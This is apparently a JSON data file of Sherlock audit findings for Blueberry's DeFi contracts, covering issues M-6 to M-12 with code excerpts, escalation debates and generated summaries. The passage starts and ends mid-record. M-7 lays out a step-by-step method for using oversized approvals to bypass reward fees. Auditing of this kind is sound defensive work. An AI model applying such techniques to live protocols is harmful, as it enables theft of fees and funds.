expect(approvalAfter).to.equal(1000);\n    });\n    \n});\n\n});\n```\n\nRunning this will result in the 2nd test to fail, because of the mismatching return data length\n\n```\n1 failing\n\n  1) Ensure Approve\n       IERC20 Interface\n         TEST USDT APPROVAL:\n     Error: Transaction reverted: function returned an unexpected amount of data\n```\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nConsidering this a value medium issue based on the discussions above, this was a valid issue that was not acknowledged in the previous contests, but now with additional information is considered a valid medium. \nI agree the `Wont fix` rule might need to be more clear of the conditions to which they are applied\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [nevillehuang](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/135/#issuecomment-1693509481): accepted",
      "summary": "\nThis bug report is about an issue found in the Open Zeppelin's `safeTransfer()` which is used throughout the blueberry contracts. This issue affects the `EnsureApprove` contract which uses a normal IERC20 interface and a normal `approve()` function call. Since USDT doesn't return a boolean as expected by the interface, this would leave the contract unusable if a SoftVault is deployed using USDT as the `uToken`. This can lead to loss of funds as the cost to deploy the contract will essentially have been wasted.\n\nThe developers explicitly stated that they intend to use USDT as an underlying token in the `SoftVault`'s NatSpec. The code snippet can be found at https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/utils/EnsureApprove.sol#L27. Manual review was used to find the issue.\n\nThe recommended solution is to add support for USDT by importing another interface with ERC20 functions that don't return values. This bug report was discussed in the previous competition and marked as No-Fix and Non-Reward. However, it was escalated by nevillehuang, who pointed out that the IERC20 interface would fit also USDT as it has an approve function and no function signature is used anywhere. This was accepted.\n\nThe result of this bug report is that it is considered a valid medium issue. It was not acknowledged in the previous contests, but now with additional information is considered a valid medium. It is agreed that the `Wont fix` rule might need to be more clear of the conditions to which they are applied.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/135",
      "tags": [],
      "finders": [
        "trauki",
        "n1punp"
      ]
    },
    {
      "id": "24332",
      "title": "M-12: AuraSpell `openPositionFarm` will revert when the tokens contains `lpToken`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/125 \n\n## Found by \nbitsurfer, nobody2018, twcctop\n\nAuraSpell `openPositionFarm` will revert when the tokens contains lpToken due to array length mismatch\n\n## Vulnerability Detail\n\nIn AuraSpell, the `openPositionFarm` will call `joinPool` in Balancer's vault. But when analyzing the `JoinPoolRequest` struct, we see issue on `maxAmountsIn` and `amountsIn` which can be in different length, thus this will be reverted since in Balancer's vault, this two array should be in the same length.\n\n```js\nFile: AuraSpell.sol\n088:     function openPositionFarm(\n089:         OpenPosParam calldata param,\n090:         uint256 minimumBPT\n091:     )\n...\n095:     {\n...\n110:         /// 3. Add liquidity to the Balancer pool and receive BPT in return.\n111:         {\n...\n128:             if (poolAmountOut != 0) {\n129:                 vault.joinPool(\n130:                     wAuraPools.getBPTPoolId(lpToken),\n131:                     address(this),\n132:                     address(this),\n133:                     IBalancerVault.JoinPoolRequest({\n134:                         assets: tokens,\n135:                         maxAmountsIn: maxAmountsIn,\n136:                         userData: abi.encode(1, amountsIn, _minimumBPT),\n137:                         fromInternalBalance: false\n138:                     })\n139:                 );\n140:             }\n141:         }\n...\n178:     }\n...\n296:     function _getJoinPoolParamsAndApprove(\n297:         address vault,\n298:         address[] memory tokens,\n299:         uint256[] memory balances,\n300:         address lpToken\n301:     ) internal returns (uint256[] memory, uint256[] memory, uint256) {\n...\n304:         uint256 length = tokens.length;\n305:         uint256[] memory maxAmountsIn = new uint256[](length);\n306:         uint256[] memory amountsIn = new uint256[](length);\n307:         bool isLPIncluded;\n308:\n309:         for (i; i != length; ) {\n310:             if (tokens[i] != lpToken) {\n311:                 amountsIn[j] = IERC20(tokens[i]).balanceOf(address(this));\n312:                 if (amountsIn[j] > 0) {\n313:                     _ensureApprove(tokens[i], vault, amountsIn[j]);\n314:                 }\n315:                 ++j;\n316:             } else isLPIncluded = true;\n317:\n318:             maxAmountsIn[i] = IERC20(tokens[i]).balanceOf(address(this));\n319:\n320:             unchecked {\n321:                 ++i;\n322:             }\n323:         }\n324:\n325:         if (isLPIncluded) {\n326:             assembly {\n327:                 mstore(amountsIn, sub(mload(amountsIn), 1))\n328:             }\n329:         }\n...\n345:         return (maxAmountsIn, amountsIn, poolAmountOut);\n346:     }\n```\n\nthese `maxAmountsIn` and `amountsIn` are coming from `_getJoinPoolParamsAndApprove`. And by seeing the function, we can see that there is possible issue when the `tokens[i] == lpToken`.\n\nWhen `tokens[i] == lpToken`, the flag `isLPIncluded` will be true. And will enter this block,\n\n```js\n325:         if (isLPIncluded) {\n326:             assembly {\n327:                 mstore(amountsIn, sub(mload(amountsIn), 1))\n328:             }\n329:         }\n```\n\nthis will decrease the `amountsIn` length. Thus, `amountsIn` and `maxAmountsIn` will be in different length.\n\nIn Balancer's `JoinPoolRequest` struct, the `maxAmountsIn`, and `userData` second decoded bytes (`amountsIn`) should be the same array length, because it will be checked in Balancer.\n\n```js\n133:                     IBalancerVault.JoinPoolRequest({\n134:                         assets: tokens,\n135:                         maxAmountsIn: maxAmountsIn,\n136:                         userData: abi.encode(1, amountsIn, _minimumBPT),\n137:                         fromInternalBalance: false\n138:                     })\n```\n\nTherefore, in this situation, it will be reverted.\n\n## Impact\n\nUser can't open position on AuraSpell when `tokens` contains `lpToken`\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L326-L328\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRemove the assembly code where it will decrease the `amountsIn` length when `isLPIncluded` is true to make sure the array length are same.",
      "summary": "\nA bug was found in the AuraSpell smart contract by bitsurfer, nobody2018, and twcctop. The bug occurs when using the `openPositionFarm` function and the tokens array contains lpToken. This causes a mismatch in the array lengths of maxAmountsIn and amountsIn, which is a requirement for Balancer's JoinPoolRequest struct. This will result in the transaction being reverted when attempting to open a position on AuraSpell. The code snippet responsible for this bug is located in the AuraSpell.sol file on line 326-328. The recommended solution to this issue is to remove the assembly code that decreases the amountsIn length when isLPIncluded is true, to ensure that the array lengths are the same.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/125",
      "tags": [],
      "finders": [
        "bitsurfer",
        "nobody2018",
        "twcctop"
      ]
    },
    {
      "id": "24331",
      "title": "M-11: WConvexPool.sol will be broken on Arbitrum due to improper integration with Convex Arbitrum contracts",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/119 \n\n## Found by \nKow\nWConvexPool (and consequently ConvexSpell) will be completely broken on Arbitrum due to not accounting for implementation differences in Convex Arbitrum contracts.\n\n## Vulnerability Detail\nWConvexPool.sol is the contract expected to be deployed to both mainnet and Arbitrum (sponsor confirmed). While it does integrate with mainnet Convex contracts, it does not account for implementation differences in Arbitrum Convex contracts (briefly mentioned in their [docs](https://docs.convexfinance.com/convexfinanceintegration/side-chain-implemention) with the Arbitrum version of the Booster contract that Blueberry integrates with found [here](https://arbiscan.io/address/0xF403C135812408BFbE8713b5A23a04b3D48AAE31#readContract)). The primary issue is the change in arguments returned from ``cvxPools.poolInfo()`` when calling [``getPoolInfoFromPoolId``](https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L103-L126). Since the return signature expects 6 values (through destructuring) while the Arbitrum Booster contract's getter only returns 5 (due to a slight change in the [PoolInfo struct](https://github.com/convex-eth/sidechain-platform/blob/b9525005549c8f2d364d092bfd902b8eb05d7079/contracts/contracts/Booster.sol#L36-L43) - mainnet struct [here](https://github.com/convex-eth/platform/blob/a5da3f127a321467a97a684c57970d2586520172/contracts/contracts/Booster.sol#L48-L55)), all attempts to call it will revert. This is called in [``pendingRewards``](https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L179-L191), [``mint``](https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L235-L241), and [``burn``](https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L276-L292), 3 of the main functions in WConvexPool, and will consequently disable any interaction with it (this includes ConvexSpell which also uses this function and also attempts to call mint/burn for position management).\n\nOther issues include the use of ``cvxPools.deposit(...)`` and ``cvxPools.withdraw(...)`` which do not match any function signatures in the Arbitrum Booster contract (``withdraw`` has been changed to ``withdrawTo`` with different arguments and ``deposit`` no longer includes the 3rd argument).\n\n## Impact\nConvex integration will be completely broken on Arbitrum due to unaccounted for implementation differences.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L103-L126\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L179-L191\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L235-L241\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WConvexPools.sol#L276-L292\n\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider creating a separate contract for WConvexPools for Arbitrum that correctly accounts for the Convex Booster implementation changes.",
      "summary": "\nThis bug report is about the issue M-11 which was found by Kow. It states that the WConvexPool contract, which is expected to be deployed to both mainnet and Arbitrum, will be completely broken on Arbitrum due to not accounting for implementation differences in Convex Arbitrum contracts. \n\nThe primary issue is the change in arguments returned from ``cvxPools.poolInfo()`` when calling [``getPoolInfoFromPoolId``]. The return signature expects 6 values (through destructuring) while the Arbitrum Booster contract's getter only returns 5. This is called in ``pendingRewards``, ``mint``, and ``burn``, 3 of the main functions in WConvexPool, and will consequently disable any interaction with it (this includes ConvexSpell which also uses this function and also attempts to call mint/burn for position management).\n\nOther issues include the use of ``cvxPools.deposit(...)`` and ``cvxPools.withdraw(...)`` which do not match any function signatures in the Arbitrum Booster contract.\n\nThe impact of this is that the Convex integration will be completely broken on Arbitrum due to unaccounted for implementation differences. The code snippets and manual review were used to identify the issue. The recommendation is to consider creating a separate contract for WConvexPools for Arbitrum that correctly accounts for the Convex Booster implementation changes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/119",
      "tags": [],
      "finders": [
        "Kow"
      ]
    },
    {
      "id": "24330",
      "title": "M-10: WAuraPools doesn't correctly account for AuraStash causing all deposits to be permanently lost",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/108 \n\n## Found by \n0x52\n\nSome Aura pools have two sources of AURA. First from the booster but also as a secondary reward. This secondary reward is stash AURA that doesn't behave like regular AURA. Although properly accounted for in AuraSpell, it is not properly accounted for in WAuraPools, resulting in all deposits being unrecoverable. \n\n## Vulnerability Detail\n\n[WAuraPools.sol#L413-L418](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L413-L418)\n\n        uint256 rewardTokensLength = rewardTokens.length;\n        for (uint256 i; i != rewardTokensLength; ) {\n            IERC20Upgradeable(rewardTokens[i]).safeTransfer(\n                msg.sender,\n                rewards[i]\n            );\n\nWhen burning the wrapped LP token, it attempts to transfer each token to msg.sender. The problem is that stash AURA cannot be transferred like an regular ERC20 token and any transfers will revert. Since this will be called on every attempted withdraw, all deposits will be permanently unrecoverable.\n\n## Impact\n\nAll deposits will be permanently unrecoverable\n\n## Code Snippet\n\n[WAuraPools.sol#L360-L424](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L360-L424)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck if reward is stash AURA and send regular AURA instead similar to what is done in AuraSpell.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Kral01** commented:\n> Needs PoC\n\n\n\n**IAm0x52**\n\nEscalate\n\nThis was incorrectly excluded. \n\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/spell/AuraSpell.sol#L243-L257\n\n        for (uint256 i; i != rewardTokensLength; ) {\n            address sellToken = rewardTokens[i];\n            if (sellToken == STASH_AURA) sellToken = AURA;\n\n            _doCutRewardsFee(sellToken);\n            if (\n                expectedRewards[i] != 0 &&\n                !PSwapLib.swap(\n                    augustusSwapper,\n                    tokenTransferProxy,\n                    sellToken,\n                    expectedRewards[i],\n                    swapDatas[i]\n                )\n            ) revert Errors.SWAP_FAILED(sellToken);\n\n            /// Refund rest (dust) amount to owner\n            _doRefund(sellToken);\n\n            unchecked {\n                ++i;\n            }\n\nAuraSpell requires the above code to prevent this. WAuraPools uses the exact same reward list and needs the same protections. The result is that funds will be permanently trapped, because the transfer will always fail.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This was incorrectly excluded. \n> \n> https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/spell/AuraSpell.sol#L243-L257\n> \n>         for (uint256 i; i != rewardTokensLength; ) {\n>             address sellToken = rewardTokens[i];\n>             if (sellToken == STASH_AURA) sellToken = AURA;\n> \n>             _doCutRewardsFee(sellToken);\n>             if (\n>                 expectedRewards[i] != 0 &&\n>                 !PSwapLib.swap(\n>                     augustusSwapper,\n>                     tokenTransferProxy,\n>                     sellToken,\n>                     expectedRewards[i],\n>                     swapDatas[i]\n>                 )\n>             ) revert Errors.SWAP_FAILED(sellToken);\n> \n>             /// Refund rest (dust) amount to owner\n>             _doRefund(sellToken);\n> \n>             unchecked {\n>                 ++i;\n>             }\n> \n> AuraSpell requires the above code to prevent this. WAuraPools uses the exact same reward list and needs the same protections. The result is that funds will be permanently trapped, because the transfer will always fail.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\nSeems valid\nSTASH AURA seems to be a valid `extraRewardToken` but transfer can only be called from the pool, which will actually transfer AURA instead. \nSo if the WAURAPool tries to call transfer it will revert.\n\n**hrishibhat**\n\nResult:\nMedium\nUnique \nConsidering this issue a valid medium\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/108/#issuecomment-1694744574): accepted",
      "summary": "\nBug report M-10 is about WAuraPools not correctly accounting for AuraStash which results in all deposits being permanently lost. The bug was found by 0x52 and the vulnerability detail is found in WAuraPools.sol#L413-L418 where it attempts to transfer each token to msg.sender, which cannot be done with stash AURA. This will cause all deposits to be permanently unrecoverable. The code snippet is found in WAuraPools.sol#L360-L424. The tool used to find the bug was manual review. The recommendation is to check if reward is stash AURA and send regular AURA instead similar to what is done in AuraSpell. The discussion between sherlock-admin2, Kral01, IAm0x52, Shogoki, and hrishibhat concluded with the result of the bug being accepted and the impact being all deposits being permanently unrecoverable.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/108",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "24329",
      "title": "M-9: Issue #47 from Update #1 is still present in ConvexSpell",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/106 \n\n## Found by \n0x52\n\nIssue [47](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47) from update contest 1 was only fixed for CurveSpell but wasn't fixed for ConvexSpell.\n\n## Vulnerability Detail\n\nSee issue [47](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47)\n\n## Impact\n\nSee issue [47](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47)\n\n## Code Snippet\n\n[ConvexSpell.sol#L92-L173](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L92-L173)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSee issue [47](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47)\n\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**darkart** commented:\n>  Its up to Devs if they wanna fix it\n\n\n\n**IAm0x52**\n\nEscalate\n\nThis is a completely different issue than #42. This was the same issue from the previous contest. They dev simply missed the occurrence in convex spell. This is a valid med and needs to be fixed.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is a completely different issue than #42. This was the same issue from the previous contest. They dev simply missed the occurrence in convex spell. This is a valid med and needs to be fixed.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\n> Escalate\n> \n> This is a completely different issue than #42. This was the same issue from the previous contest. They dev simply missed the occurrence in convex spell. This is a valid med and needs to be fixed.\n\nAgree, not a duplicate #42. This is an issue from the previous contest that was fixed, but is here found at a different place. Can be a valid finding on its own.\n\n**IAm0x52**\n\nMissed that this should be a dupe of #60 \n\n**hrishibhat**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/106/#issuecomment-1694745204): accepted\n\n**hrishibhat**\n\nConsidering this issue a valid issue on its own. #60 talks of the fix that was implemented in the previous contest, while this issue points to the original underlying issue that still existed in one of the contracts. \nThis is a unique situation, hence both the issues are treated separately",
      "summary": "\nThis bug report is about an issue (#47) that was fixed for CurveSpell but wasn't fixed for ConvexSpell. The issue was found by 0x52 and is detailed in the original issue (#47). The impact of the issue is also discussed in the original issue. The code snippet that is relevant to this issue is located at ConvexSpell.sol#L92-L173. The tool used for finding this issue was Manual Review. The recommendation for this issue is also discussed in the original issue.\n\nThe discussion about this issue was mainly between sherlock-admin2, darkart, IAm0x52, and Shogoki. sherlock-admin2 and IAm0x52 both suggested that the issue should be escalated and that it is a valid finding that needs to be fixed. Shogoki agreed, saying that the issue is not a duplicate of #42 and can be treated as a valid issue on its own. IAm0x52 then realized that the issue should be considered a duplicate of #60. Finally, hrishibhat concluded that this issue is a valid issue on its own and is not a duplicate of #60.\n\nThe issue was then escalated successfully and the status was accepted by IAm0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/106",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "24328",
      "title": "M-8: ConvexSpell is completely broken for any curve LP that utilizes native ETH",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/105 \n\n## Found by \n0x52, 0xjoseph\n\nWhen a Curve pool utilizes native ETH it uses the address `0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee`. This is problematic because it will try to call balanceOf on this address which will always revert.\n\n## Vulnerability Detail\n\n[ConvexSpell.sol#L120-L127](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L120-L127)\n\n        if (tokens.length == 2) {\n            uint256[2] memory suppliedAmts;\n            for (uint256 i; i != 2; ++i) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n\nConvexSpell#openPositionFarm attempts to call balanceOf on each component of the LP. Since native ETH uses the `0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee` this call will always revert. This breaks compatibility with EVERY curve pool that uses native ETH which make most of the highest volume pools on the platfrom.\n\n## Impact\n\nConvexSpell is completely incompatible with a majority of Curve pools\n\n## Code Snippet\n\n[ConvexSpell.sol#L92-L173](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L92-L173)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI would recommend conversion between native ETH and wETH to prevent this issue.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because the design of the protocol does not show desire for ETH compatibility so the issue can be classified as informational",
      "summary": "\nThis bug report is about the ConvexSpell contract, which is used for Curve pool liquidity provision. The issue is that when a Curve pool utilizes native ETH, the address `0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee` is used, which causes ConvexSpell to try to call balanceOf on this address which will always revert. This makes ConvexSpell incompatible with most Curve pools, which are the highest volume pools on the platform. The code snippet and recommendation are included in the report. A comment from 0xyPhilic was also included, noting that the issue can be classified as informational because the design of the protocol does not show desire for ETH compatibility. To fix this issue, conversion between native ETH and wETH should be implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/105",
      "tags": [],
      "finders": [
        "0x52",
        "0xjoseph"
      ]
    },
    {
      "id": "24327",
      "title": "M-7: Adversary can abuse hanging approvals left by PSwapLib.swap to bypass reward fees",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/104 \n\n## Found by \n0x52\n\nPSwapLib.swap can be manipulated to leave hanging allowances via the expectedRewards input. These can then be abused to swap reward tokens out of order allowing them to bypass fees.\n\n## Vulnerability Detail\n\n[AuraSpell.sol#L247-L257](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L247-L257)\n\n            _doCutRewardsFee(sellToken);\n            if (\n                expectedRewards[i] != 0 &&\n                !PSwapLib.swap(\n                    augustusSwapper,\n                    tokenTransferProxy,\n                    sellToken,\n                    expectedRewards[i],\n                    swapDatas[i]\n                )\n            ) revert Errors.SWAP_FAILED(sellToken);\n\nAuraSpell#closePositionFarm allows the user to specify any expectedRewards they wish. This allows the user to approve any amount, even if the amount is much larger than they would otherwise use. The can abuse these hanging approvals to swap tokens out of order and avoid paying reward fees.\n\nExample:\nAssume there are two rewards, token A and token B. Over time a user's position accumulates 100 rewards for each token. Normally the user would have to pay fees on those rewards. However they can bypass it by first creating hanging approvals. The user would start by redeeming a very small amount of LP and setting expectedRewards to uint256.max. They wouldn't sell the small amount leaving a very large approval left for both tokens. Now the user withdraws the rest of their position. This time they specify the swap data to swap token B first. The user still has to pay fees on token A but now they have traded token B before any fees can be taken on it. \n\n## Impact\n\nUser can bypass reward fees\n\n## Code Snippet\n\n[AuraSpell.sol#L184-L286](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L184-L286)\n\n[ConvexSpell.sol#L179-L229](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L179-L229)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAfter the swap reset allowances to 0\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because fees are cut before the supplied check in _doCutFees function\n\n**Kral01** commented:\n> Not how approval works\n\n\n\n**IAm0x52**\n\nEscalate\n\nThis was wrongly excluded. The judging comments above are incorrect. The code allows the user to make any swap in whatever order they want. This is what allows the user to bypass the fees. The user is meant to swap in the order that the tokens are listed but by swapping in a different order they can bypass the cut. Assume we have two tokens to claim. Normally the flow would be:\n\nRewardCut A > Swap A > RewardCut B > Swap B\n\nUsing the methodology I've shown above the user can instead:\n\nRewardCut A > Swap B > RewardCutB > Swap A\n\nHere we see that B can be swapped before the reward cut allowing the fee to be bypassed.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This was wrongly excluded. The judging comments above are incorrect. The code allows the user to make any swap in whatever order they want. This is what allows the user to bypass the fees. The user is meant to swap in the order that the tokens are listed but by swapping in a different order they can bypass the cut. Assume we have two tokens to claim. Normally the flow would be:\n> \n> RewardCut A > Swap A > RewardCut B > Swap B\n> \n> Using the methodology I've shown above the user can instead:\n> \n> RewardCut A > Swap B > RewardCutB > Swap A\n> \n> Here we see that B can be swapped before the reward cut allowing the fee to be bypassed.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\n> Escalate\n> \n> This was wrongly excluded. The judging comments above are incorrect. The code allows the user to make any swap in whatever order they want. This is what allows the user to bypass the fees. The user is meant to swap in the order that the tokens are listed but by swapping in a different order they can bypass the cut. Assume we have two tokens to claim. Normally the flow would be:\n> \n> RewardCut A > Swap A > RewardCut B > Swap B\n> \n> Using the methodology I've shown above the user can instead:\n> \n> RewardCut A > Swap B > RewardCutB > Swap A\n> \n> Here we see that B can be swapped before the reward cut allowing the fee to be bypassed.\n\nAgree with escalation. As the user can specify any `expectedRewards` and any `callData` in any order, this is a valid attack vector.\n\n**hrishibhat**\n\n@Gornutz \n\n**Gornutz**\n\nThe paraswap lib is already resetting the token approval to zero prior to allocating the allowance for each swap - https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/libraries/Paraswap/PSwapLib.sol#L15 \n\n\n**Shogoki**\n\n> The paraswap lib is already resetting the token approval to zero prior to allocating the allowance for each swap - https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/libraries/Paraswap/PSwapLib.sol#L15\n\nI do not think this helps preventing this issue. As the approval is resetted before the swap, there still can be a hanging approval.\nIssue is that the approval is set/reset for the specified sellToken, but the user can swap any other token by specifying different calldatas. Therefore, i think the stated attack path is still possible\n\n**Gornutz**\n\nGotcha, then yes seems valid \n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nThis is a valid medium issue\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/104/#issuecomment-1694746004): accepted",
      "summary": "\nA bug was reported in the PSwapLib.swap function, which is part of the AuraSpell and ConvexSpell contracts. This bug allows a user to bypass reward fees by manipulating the expectedRewards input. This is done by first redeeming a small amount of LP and setting expectedRewards to uint256.max. This leaves a large hanging approval which can then be abused to swap tokens out of order and avoid paying reward fees. It is recommended that after the swap the allowances should be reset to 0. After discussion, the bug was escalated to a medium issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/104",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "24326",
      "title": "M-6: AuraSpell#closePositionFarm will take reward fees on underlying tokens when borrow token is also a reward",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/103 \n\n## Found by \n0x52\n\nAuraSpell#AuraSpell#closePositionFarm will take reward fees on underlying tokens when borrow token is also a reward. This is because the BLP is burned before taking the reward cut.\n\n## Vulnerability Detail\n\n[AuraSpell.sol#L227-L247](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L227-L247)\n\n                wAuraPools.getVault(lpToken).exitPool(\n                    IBalancerPool(lpToken).getPoolId(),\n                    address(this),\n                    address(this),\n                    IBalancerVault.ExitPoolRequest(\n                        tokens,\n                        minAmountsOut,\n                        abi.encode(0, amountPosRemove, borrowTokenIndex),\n                        false\n                    )\n                );\n            }\n        }\n\n        /// 4. Swap each reward token for the debt token\n        uint256 rewardTokensLength = rewardTokens.length;\n        for (uint256 i; i != rewardTokensLength; ) {\n            address sellToken = rewardTokens[i];\n            if (sellToken == STASH_AURA) sellToken = AURA;\n\n            _doCutRewardsFee(sellToken);\n\nWe can see above that closePositionFarm redeems the BLP before it takes the reward cut. This can cause serious issues. If there is any overlap between the reward tokens and the borrow token then _doCutRewardsFee will take a cut of the underlying liquidity. This causes loss to the user as too many fees are taken from them.\n\n## Impact\n\nUser will lose funds due to incorrect fees\n\n## Code 